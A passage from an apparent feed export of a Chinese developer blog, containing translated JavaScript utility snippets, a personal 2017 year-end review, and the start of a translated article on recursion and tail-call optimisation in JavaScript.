range (指定范围内的随机整数)</h3><p>使用 <code>Math.random()</code> 去生成一个在指定范围内的随机数，使用 <code>Math.floor()</code> 将其转换为整数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> randomIntegerInRange = <span class="function">(<span class="params">min, max</span>) =&gt;</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (max - min + <span class="number">1</span>)) + min;</span><br><span class="line"><span class="comment">// randomIntegerInRange(0, 5) -&gt; 2</span></span><br></pre></td></tr></table></figure><h3 id="Random-number-in-range-指定范围内的随机数"><a href="#Random-number-in-range-指定范围内的随机数" class="headerlink" title="Random number in range (指定范围内的随机数)"></a>Random number in range (指定范围内的随机数)</h3><p>使用 <code>Math.random()</code> 去生成一个在指定范围内的随机数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> randomInRange = <span class="function">(<span class="params">min, max</span>) =&gt;</span> <span class="built_in">Math</span>.random() * (max - min) + min;</span><br><span class="line"><span class="comment">// randomInRange(2,10) -&gt; 6.0211363285087005</span></span><br></pre></td></tr></table></figure><h3 id="RGB-to-hexadecimal-RGB转十六进制"><a href="#RGB-to-hexadecimal-RGB转十六进制" class="headerlink" title="RGB to hexadecimal (RGB转十六进制)"></a>RGB to hexadecimal (RGB转十六进制)</h3><p>使用按位左移运算符（<code>&lt;&lt;</code>）和 <code>toString(16)</code> 将 RGB 参数转换为十六进制，然后使用 <code>padStart(6, &#39;0&#39;)</code> 去获取6位数的十六进制。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rgbToHex = <span class="function">(<span class="params">r, g, b</span>) =&gt;</span> ((r &lt;&lt; <span class="number">16</span>) + (g &lt;&lt; <span class="number">8</span>) + b).toString(<span class="number">16</span>).padStart(<span class="number">6</span>, <span class="string">'0'</span>);</span><br><span class="line"><span class="comment">// rgbToHex(255, 165, 1) -&gt; 'ffa501'</span></span><br></pre></td></tr></table></figure><h3 id="Swap-values-of-two-variables-交换两个变量的值"><a href="#Swap-values-of-two-variables-交换两个变量的值" class="headerlink" title="Swap values of two variables (交换两个变量的值)"></a>Swap values of two variables (交换两个变量的值)</h3><p>使用数组解构来交换两个变量之间的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[varA, varB] = [varB, varA];</span><br><span class="line"><span class="comment">// [x, y] = [y, x]</span></span><br></pre></td></tr></table></figure><h3 id="URL-parameters-（URL参数）"><a href="#URL-parameters-（URL参数）" class="headerlink" title="URL parameters （URL参数）"></a>URL parameters （URL参数）</h3><p>使用 <code>match()</code> 和一个合适的正则去获取所有键值对，使用 <code>Array.reduce()</code> 合并到一个对象中。<br>允许将 <code>location.search</code> 作为参数传递。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getUrlParameters = <span class="function"><span class="params">url</span> =&gt;</span></span><br><span class="line">  url.match(<span class="regexp">/([^?=&amp;]+)(=([^&amp;]*))/g</span>).reduce(</span><br><span class="line">    (a, v) =&gt; (a[v.slice(<span class="number">0</span>, v.indexOf(<span class="string">'='</span>))] = v.slice(v.indexOf(<span class="string">'='</span>) + <span class="number">1</span>), a), &#123;&#125;</span><br><span class="line">  );</span><br><span class="line"><span class="comment">// getUrlParameters('http://url.com/page?name=Adam&amp;surname=Smith') -&gt; &#123;name: 'Adam', surname: 'Smith'&#125;</span></span><br></pre></td></tr></table></figure><h3 id="UUID-generator-（UUID生成器）"><a href="#UUID-generator-（UUID生成器）" class="headerlink" title="UUID generator （UUID生成器）"></a>UUID generator （UUID生成器）</h3><p>使用 <code>crypto</code> API 生成符合 <a href="https://www.ietf.org/rfc/rfc4122.txt" target="_blank" rel="noopener">RFC4122</a> 版本4的UUID。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> uuid = <span class="function"><span class="params">_</span> =&gt;</span></span><br><span class="line">  ([<span class="number">1e7</span>] + <span class="number">-1e3</span> + <span class="number">-4e3</span> + <span class="number">-8e3</span> + <span class="number">-1e11</span>).replace(<span class="regexp">/[018]/g</span>, c =&gt;</span><br><span class="line">    (c ^ crypto.getRandomValues(<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">1</span>))[<span class="number">0</span>] &amp; <span class="number">15</span> &gt;&gt; c / <span class="number">4</span>).toString(<span class="number">16</span>)</span><br><span class="line">  );</span><br><span class="line"><span class="comment">// uuid() -&gt; '7982fcfe-5721-4632-bede-6000885be57d'</span></span><br></pre></td></tr></table></figure><h3 id="Validate-email-（校验邮箱）"><a href="#Validate-email-（校验邮箱）" class="headerlink" title="Validate email （校验邮箱）"></a>Validate email （校验邮箱）</h3><p>Use a regular experssion to check if the email is valid.<br>Returns <code>true</code> if email is valid, <code>false</code> if not.</p><p>使用正则表达式去检验邮箱格式。<br>返回 <code>true</code> 表示邮箱格式正确，<code>false</code> 则不正确。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> validateEmail = <span class="function"><span class="params">str</span> =&gt;</span></span><br><span class="line">  /^(([^<span class="xml"><span class="tag">&lt;&gt;</span>()\[\]\\.,;:\s@"]+(\.[^<span class="tag">&lt;&gt;</span>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/.test(str);</span></span><br><span class="line"><span class="xml">// validateEmail(mymail@gmail.com) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Validate-number-（校验数值）"><a href="#Validate-number-（校验数值）" class="headerlink" title="Validate number （校验数值）"></a>Validate number （校验数值）</h3><p>使用 <code>!isNaN</code> 和 <code>parseFloat()</code> 来检查参数是否是一个数字（或允许转换为数值）。<br>使用 <code>isFinite()</code> 来检查数字是否是有限的。<br>使用 Number() 来检查数值转换是否成立。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> validateNumber = <span class="function"><span class="params">n</span> =&gt;</span> !<span class="built_in">isNaN</span>(<span class="built_in">parseFloat</span>(n)) &amp;&amp; <span class="built_in">isFinite</span>(n) &amp;&amp; <span class="built_in">Number</span>(n) == n;</span><br><span class="line"><span class="comment">// validateNumber('10') -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Value-or-default-（值或默认值）"><a href="#Value-or-default-（值或默认值）" class="headerlink" title="Value or default （值或默认值）"></a>Value or default （值或默认值）</h3><p>默认返回 <code>value</code> 如果 <code>value</code> 为假，则返回默认值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> valueOrDefault = <span class="function">(<span class="params">value, d</span>) =&gt;</span> value || d;</span><br><span class="line"><span class="comment">// valueOrDefault(NaN, 30) -&gt; 30</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;这是对 github 上&lt;a href=&quot;https://github.com/Chalarangelo/30-seconds-of-code&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;30s代码片段&lt;/a&gt;的翻译整理，由于作
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="javascript" scheme="http://blog.minfive.com/tags/javascript/"/>
    
      <category term="翻译" scheme="http://blog.minfive.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>2017年个人总结</title>
    <link href="http://blog.minfive.com/2018/01/03/2018-01-03-2017-summary/"/>
    <id>http://blog.minfive.com/2018/01/03/2018-01-03-2017-summary/</id>
    <published>2018-01-02T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<p>吭哧吭哧的打代码，迷迷糊糊的就是一年，因为懒癌而迟到的年度总结也总算交卷，虽然今天已经是2018年的第三天，但也算是正式为自己的2017年的工作、学习以及生活划上句点。</p><h3 id="工作方面"><a href="#工作方面" class="headerlink" title="工作方面"></a>工作方面</h3><p>2017这一年说快也不快，说慢也不慢，风风火火的赶了几个月项目，期间又不间断的穿插 H5 营销项目的开发，说实在的，个人并不喜欢快餐式的开发，任何一个惊艳全场的产品势必需要经过千锤百炼。</p><p>很庆幸，今年研发的主要精力放在产品上，有机会对现有项目进行迭代改造，从 vue1 到 vue2，从代码杂乱无章到 eslint 规范编码，从 bug 百出到单元测试，一步步规范工作流程，一步步朝正规军方向前进。唯一的遗憾是没能在项目中孵化点什么开源项目来，总归差了点什么。</p><p>在今年的后半段，开始负责前端开发小组的日常管理，埋头撸了一年代码抬头才发现自己对管理一窍不通，再加之生性放浪，不愿受约束更不愿约束别人，很多时候工作都有点乱糟糟的感觉。哎，躲了这么多年，终归得面对，是时候吭哧吭哧的补一波管理能力了。</p><p>今年后半段还带了一个实习生（玉米）妹子，由于第一次带实习生，再加上妹子以及指导经验的缺失，导致前期过份放松，后期又不停施压的情况发生，妹子承受不了请辞，想来也是我的责任吧！抽时间得好好反思下。</p><h3 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h3><h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><p>2017对于学习来说算是一个半糟糕的一年，技能较之去年并无明显进步，仅有岁数。</p><p>追随 vue 从 1 到 2 到现在快 3 了，回头才发现把其余两大框架都给落下了，18年得在这基础上好好补补。</p><p>去年立的前端可视化(canvas、webGL)的 flag还没能填上，希望18年能把坑给填咯。 </p><p>原定计划用来补充基本知识的书籍 《深入理解计算机系统》《算法导论》《TCP/IP协议》 迟迟没有开封（- -贼尴尬）。</p><p>通过 《鸟哥的Linux私房菜》 补充了下 linux 的基础，买了自己的服务器，也搭建了自己的个人站点，但关于 linux 的知识还是需要进一步加强。</p><p>今年通过同步翻译官方文档去学习强化 node.js，虽然最后翻译阉割了，但还是学到了很多服务端的知识，遗憾的是不熟悉 c++ ，无法进一步学习源码。</p><h4 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h4><p>颓废的一年中还做了三个开源项目：<a href="https://github.com/Mrminfive/hexo-theme-skapp" target="_blank" rel="noopener">hexo博客主题</a>，<a href="https://github.com/Mrminfive/vue-multiple-page" target="_blank" rel="noopener">webpack多页面脚手架</a> 以及 <a href="https://github.com/Mrminfive/nodejs.doc.cn" target="_blank" rel="noopener">node.js文档翻译</a>（虽然最后因为懒而阉割了），很庆幸收获了人生中第一个pull requests，第一个contributors以及第一个start，大约160个start，也算是对自己开源的一种激励，希望新的一年有新的进步。</p><h4 id="读书"><a href="#读书" class="headerlink" title="读书"></a>读书</h4><p>17年没看几本书，绝大部分还都是技术书籍，不过庆幸还读完了《与中国打交道》这本书，尝试着用不同的角度去看待世界。</p><p>来年的想读的书基本在微信读书上，希望能有机会把书架看完。</p><h3 id="生活方面"><a href="#生活方面" class="headerlink" title="生活方面"></a>生活方面</h3><p>今年发生了两件影响我生活的大事，第一件的是正式从小伙伴们因为工作打散，开始了独租生活，除了电脑还是电脑，有时候还真有点落寞。第二件事呢，则是在茫茫人海捞到了我家领导，正式脱离广大程序猿队伍（A_A）。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2017吧，忧喜参半，2018呢，前路漫漫，他大爷还是他大爷，挖的坑，该填还是得填！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;吭哧吭哧的打代码，迷迷糊糊的就是一年，因为懒癌而迟到的年度总结也总算交卷，虽然今天已经是2018年的第三天，但也算是正式为自己的2017年的工作、学习以及生活划上句点。&lt;/p&gt;
&lt;h3 id=&quot;工作方面&quot;&gt;&lt;a href=&quot;#工作方面&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
      <category term="经验总结" scheme="http://blog.minfive.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://blog.minfive.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript中的递归、PTC、TCO和STC</title>
    <link href="http://blog.minfive.com/2017/12/15/2017-12-15-PTC-TCO-STC/"/>
    <id>http://blog.minfive.com/2017/12/15/2017-12-15-PTC-TCO-STC/</id>
    <published>2017-12-14T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.152Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载自：<a href="http://www.zcfy.cc" target="_blank" rel="noopener">众成翻译</a><br>译者：<a href="http://www.zcfy.cc/@cncuckoo" target="_blank" rel="noopener">为之漫笔</a><br>链接：<a href="http://www.zcfy.cc/article/2813" target="_blank" rel="noopener">http://www.zcfy.cc/article/2813</a><br>原文：<a href="http://lucasfcosta.com/2017/05/08/All-About-Recursion-PTC-TCO-and-STC-in-JavaScript.html" target="_blank" rel="noopener">http://lucasfcosta.com/2017/05/08/All-About-Recursion-PTC-TCO-and-STC-in-JavaScript.html</a></p></blockquote><p>近来，好像大家都对函数式编程及其概念非常感兴趣。可是，很多人不谈递归，特别是不谈PTC（Proper Tail Call，适当的尾调用）。而这才是编写清晰简洁代码，同时又不导致栈溢出的关键。</p><p>本文将通过图示的方法讨论<strong>递归</strong>，讨论什么是<strong>PTC</strong>、<strong>TCO</strong>（Tail Call Optimization，尾调用优化）、<strong>STC</strong>（Syntactic Tail Call，语法级尾调用），以及<strong>它们的区别</strong>、<strong>原理</strong>，还会讨论<strong>主流JavaScript引擎对它们的实现</strong>。</p><p>本文还会讨论调用栈和堆栈追踪，但不会太深入细节。如果你想了解更多关于这方面的内容，可以看一看<a href="http://lucasfcosta.com/2017/02/17/JavaScript-Errors-and-Stack-Traces.html" target="_blank" rel="noopener">我的另一篇文章</a>（对了，它是迄今为止我网站上阅读量最高的）。</p><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>递归出现在某个问题的解决方案依赖于对其别的实例应用同样的解决方案之时。</p><p>比如，<code>4</code> 的 <code>factorial</code>（阶乘）可以定义为 <code>3</code> 的 <code>factorial</code> 乘以 <code>4</code>。</p><p>这意味着一个数的阶乘可以通过它自己来定义：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">factorial(<span class="number">5</span>) = factorial(<span class="number">4</span>) * <span class="number">5</span></span><br><span class="line">factorial(<span class="number">5</span>) = factorial(<span class="number">3</span>) * <span class="number">4</span> * <span class="number">5</span></span><br><span class="line">factorial(<span class="number">5</span>) = factorial(<span class="number">2</span>) * <span class="number">3</span> * <span class="number">4</span> * <span class="number">5</span></span><br><span class="line">factorial(<span class="number">5</span>) = factorial(<span class="number">1</span>) * <span class="number">2</span> * <span class="number">3</span> * <span class="number">4</span> * <span class="number">5</span></span><br><span class="line">factorial(<span class="number">5</span>) = factorial(<span class="number">0</span>) * <span class="number">1</span> * <span class="number">2</span> * <span class="number">3</span> * <span class="number">4</span> * <span class="number">5</span></span><br><span class="line">factorial(<span class="number">5</span>) = <span class="number">1</span> * <span class="number">1</span> * <span class="number">2</span> * <span class="number">3</span> * <span class="number">4</span> * <span class="number">5</span></span><br></pre></td></tr></table></figure><p>简言之，在函数调用自身时，我们说就用到了递归。</p><h3 id="理解递归"><a href="#理解递归" class="headerlink" title="理解递归"></a>理解递归</h3><p>说到理解递归，我比较喜欢想象从首次执行衍生出多个执行分支，然后这些分支的执行结果再“冒泡”回到根调用。</p><p>以前面计算阶乘为例，第一次调用派生出多个调用，直到派生出本身存在定义的调用为止（具体来说，就是到调用0的阶乘为止，因为根据定义0的阶乘为1）。然后，这个定义的结果立即返回（冒泡），以便基于这个结果执行另一个操作并再次返回值。之后这个过程重复进行，直到把最终结果返回给“根”调用。</p><p>如果用图示方式可视化地展示以 <code>5</code> 为参数调用 <code>factorial</code> 函数，那么可以这样表示：</p><p><img src="http://blog.static.minfive.com/post/17-12-15/t01a75ef0acd2ea584a.png" alt="factorial-1"></p><p>与编译器理论相比较，这个过程非常像使用<a href="https://en.wikipedia.org/wiki/Context-free_grammar" target="_blank" rel="noopener">上下文无关语法</a>取得句子，直至遇到终点值。</p><p>乍一看还挺抽象，那我们就换一种方式来说明一下，这次以计算N个数的 <a href="https://en.wikipedia.org/wiki/Fibonacci_number" target="_blank" rel="noopener">Fibonnacci Sequence</a>（斐波纳契数列）为例。</p><p>这是 <code>Fibonacci</code> 函数的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// N is the Nth fibonacci</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (n &amp;lt; <span class="number">2</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> fibonacci(n - <span class="number">2</span>) + fibonacci(n - <span class="number">1</span>)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单地说，每次调用Fibonacci函数都会派生两次新调用，新调用同样调用自身，直到参数变成一个小于2的数（因为此时的斐波纳契数列从1和1相加开始，结果为2）。</p><p>在参数小于2时，直接返回结果给上级调用，然后上级调用再逐级将结果冒泡返回给根调用。</p><p>如下图所示，调用 <code>fibonacci(4)</code> 会派生多次调用，直到调用能够直接返回结果（“既定方案”），在这里就是Fibonacci数列的前两个数：1（<code>fibonacci(1)</code>）和1（<code>fibonacci(0)</code>）。</p><p><img src="http://blog.static.minfive.com/post/17-12-15/t01a75ef0acd2ea584a.png" alt="factorial-1"></p><p>由于每次递归调用都依赖于另外两次递归调用（除非参数小于2直接返回既定结果），因此我们从叶节点（<code>1</code>）开始返回值，然后对两次递归调用的结果求和，再把结果返回给上级调用。</p><p><img src="http://blog.static.minfive.com/post/17-12-15/t01d30ac70f52b5f7d5.png" alt="factorial-2"></p><p>如上面的例子所示，递归有线性递归和分支递归之分。线性递归，就是递归调用只有一个分支，就像计算阶乘那样。分支递归，就是递归调用不止一个分支，像计算斐波纳契数列那样。</p><p>说到递归，主要应该考虑两点：</p><ol><li>定义退出条件，也就是自身即结果的原子级定义（也叫“既定结果”）。</li><li>定义算法的哪个部分是可递归的</li></ol><p>定义了退出条件后，就可以轻松确定什么情况下函数还要再调用自己，什么情况下可以直接使用现成的结果。</p><p>如果想了解更多关于递归的实践和有趣应用，请参考树和图相关算法的工作原理。</p><h3 id="递归与调用栈"><a href="#递归与调用栈" class="headerlink" title="递归与调用栈"></a>递归与调用栈</h3><p>通常，在使用递归的时候，一般都会产生一个函数调用栈，其中每个函数都需要使用前一次自我调用的结果。</p><p>想要更好地理解调用栈的原理，或者如何看懂栈追踪信息，<a href="http://lucasfcosta.com/2017/02/17/JavaScript-Errors-and-Stack-Traces.html" target="_blank" rel="noopener">请参考这篇文章</a>。</p><p>为说明使用递归时的调用栈是什么样的，我们以简单的 <code>factorial</code> 函数作例子。</p><p>以下是它的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们调用它看看 <code>3</code> 的阶乘。</p><p>通过前面的例子我们知道，<code>3</code> 的阶乘要计算 <code>factorial(2)</code>、<code>factorial(1)</code> 和 <code>factorial(0)</code> 并将它们的结果相乘。这意味着，要计算3的阶乘，需要额外调用 <code>3</code> 次<code>factorial</code> 函数。</p><p>以上每次调用都会把一个新的栈帧推到调用栈上，而所有调用都进栈后的结果大致如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">factorial(<span class="number">0</span>) <span class="comment">// The factorial of 0 is 1 by definition (base case)</span></span><br><span class="line">factorial(<span class="number">1</span>) <span class="comment">// This call depends on factorial(0)</span></span><br><span class="line">factorial(<span class="number">2</span>) <span class="comment">// This call depends on factorial(1)</span></span><br><span class="line">factorial(<span class="number">3</span>) <span class="comment">// This first call depends on factorial(2)</span></span><br></pre></td></tr></table></figure><p>现在，我们添加对 <code>console.trace</code> 的调用，以便调用 <code>factorial</code> 函数时在调用栈中看到当前的栈帧。</p><p>更改后的代码应该是这样的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.trace()</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">3</span>) <span class="comment">// Let's call the factorial function and see what happens</span></span><br></pre></td></tr></table></figure><p>下面我们就来运行代码，分析打印出的每一段调用栈信息。</p><p>这是第一段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Trace</span><br><span class="line">    at factorial (repl:2:9)</span><br><span class="line">    at repl:1:1 // Ignore everything below this line, it&apos;s just implementation details</span><br><span class="line">    at realRunInThisContextScript (vm.js:22:35)</span><br><span class="line">    at sigintHandlersWrap (vm.js:98:12)</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:24:12)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:313:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br><span class="line">    at REPLServer.runBound [as eval] (domain.js:293:12)</span><br><span class="line">    at REPLServer.onLine (repl.js:513:10)</span><br><span class="line">    at emitOne (events.js:101:20)</span><br></pre></td></tr></table></figure><p>看到了吧，第一个调用栈只包含对 <code>factorial</code> 函数的第一次调用，也就是 <code>factorial(3)</code>。接下来就有意思了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Trace</span><br><span class="line">    at factorial (repl:2:9)</span><br><span class="line">    at factorial (repl:7:12)</span><br><span class="line">    at repl:1:1 // Ignore everything below this line, it&apos;s just implementation details</span><br><span class="line">    at realRunInThisContextScript (vm.js:22:35)</span><br><span class="line">    at sigintHandlersWrap (vm.js:98:12)</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:24:12)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:313:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br><span class="line">    at REPLServer.runBound [as eval] (domain.js:293:12)</span><br><span class="line">    at REPLServer.onLine (repl.js:513:10)</span><br></pre></td></tr></table></figure><p>这次我们在上一次调用基础上又调用了 <code>factorial</code> 函数。这个调用是 <code>factorial(2)</code>。</p><p>这是调用 <code>factorial(1)</code> 时的栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Trace</span><br><span class="line">    at factorial (repl:2:9)</span><br><span class="line">    at factorial (repl:7:12)</span><br><span class="line">    at factorial (repl:7:12)</span><br><span class="line">    at repl:1:1</span><br><span class="line">    at realRunInThisContextScript (vm.js:22:35)</span><br><span class="line">    at sigintHandlersWrap (vm.js:98:12)</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:24:12)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:313:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br><span class="line">    at REPLServer.runBound [as eval] (domain.js:293:12)</span><br></pre></td></tr></table></figure><p>我们看到，这在之前调用的基础上又增加了一次调用。</p><p>最后是调用 <code>factorial(0)</code> 时的调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Trace</span><br><span class="line">    at factorial (repl:2:9)</span><br><span class="line">    at factorial (repl:7:12)</span><br><span class="line">    at factorial (repl:7:12)</span><br><span class="line">    at factorial (repl:7:12)</span><br><span class="line">    at repl:1:1</span><br><span class="line">    at realRunInThisContextScript (vm.js:22:35)</span><br><span class="line">    at sigintHandlersWrap (vm.js:98:12)</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:24:12)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:313:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br></pre></td></tr></table></figure><p>正像我在本节开始时说的一样，调用 <code>factorial(3)</code> 需要进一步调用 <code>factorial(2)</code>、<code>factorial(1)</code> 和 <code>factorial(0)</code>。这就是 <code>factorial</code> 函数在调用栈中现身 <code>4</code> 次的原因。</p><p>看到这里，读者应该注意到递归调用过多的问题了：调用栈会越来越大，最终可能导致 <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener">Stack Buffer Overflow</a>。只要栈达到容量上限，多一个调用就会造成溢出。</p><p>如果你想知道自己JavaScript运行环境中的栈有多少个帧，那我强烈推荐<a href="http://2ality.com/2014/04/call-stack-size.html" target="_blank" rel="noopener">Dr. Axel Rauschmayer（我是他的忠实粉丝）的方法</a>。</p><h3 id="适当的尾调用（PTC）"><a href="#适当的尾调用（PTC）" class="headerlink" title="适当的尾调用（PTC）"></a>适当的尾调用（PTC）</h3><p>ES6出来后应该会实现适当的尾调用，但是由于我将在本文后面解释的原因，所有主要的JS引擎目前都没有实现。</p><p>适当的尾调用可以避免递归调用时的栈膨胀。不过，为了做到适当的尾调用，我们<strong>首先得有一个尾调用</strong>。</p><p>那什么是尾调用？</p><p>尾调用是执行时不会造成栈膨胀的函数。尾调用是执行 <code>return</code> 之前要做的最后一个操作，而这个被调用函数的返回值由调用它的函数返回。调用函数不能是 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*" target="_blank" rel="noopener">生成器函数</a>。</p><p>如果你研究编译器理论，那么可以看看<a href="http://www.ecma-international.org/ecma-262/6.0/index.html#sec-isintailposition" target="_blank" rel="noopener">ECMA规范中的正式定义</a>。</p><p>为了演示适当的尾调用如何起作用，我们需要重构 <code>factorial</code> 函数，实现尾递归：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If total is not provided we assign 1 to it</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> total</span><br><span class="line">    